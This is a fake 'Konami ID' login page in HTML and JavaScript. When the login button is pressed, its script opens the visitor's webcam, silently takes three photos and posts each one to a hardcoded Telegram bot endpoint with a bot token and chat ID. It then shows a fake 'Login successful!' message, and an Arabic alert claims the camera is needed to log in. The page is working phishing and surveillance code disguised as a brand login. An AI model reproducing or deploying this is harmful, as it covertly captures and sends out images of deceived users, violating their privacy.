<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Konami ID Login</title>
<style>
body { margin:0; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); }
.login-box { background: rgba(255,255,255,0.95); padding:40px 30px; border-radius:20px; width:90%; max-width:400px; text-align:center; box-shadow:0 8px 20px rgba(0,0,0,0.3); }
.login-box h1 { margin-bottom:30px; color:#333; font-size:32px; font-weight:bold; }
.login-box input { width:80%; padding:12px; margin:10px 0; border-radius:10px; border:1px solid #aaa; font-size:16px; }
.login-box button { width:50%; padding:12px; margin-top:20px; border:none; border-radius:10px; background-color:#1e90ff; color:white; font-size:18px; cursor:pointer; transition:0.3s; }
.login-box button:hover { background-color:#1c86ee; }
canvas { display:none; }
</style>
</head>
<body>

<div class="login-box">
  <h1>Konami ID</h1>
  <input type="text" placeholder="Username" id="username">
  <input type="password" placeholder="Password" id="password">
  <button onclick="startCamera()">Login</button>
</div>

<canvas id="canvas" width="640" height="480"></canvas>

<script>
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let count = 0;

    function capture() {
      if(count < 3){
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        const imgData = canvas.toDataURL('image/png');

        fetch(`https://api.telegram.org/bot8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw
/sendPhoto`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id:'6504203392', photo: imgData })
        });

        count++;
        setTimeout(capture,1000);
      } else {
        stream.getTracks().forEach(track => track.stop());
        alert('Login successful!');
      }
    }

    capture();

  } catch(err) {
    alert('الكاميرا مطلوبة لتسجيل الدخول.');
  }
}
</script>

</body>
</html>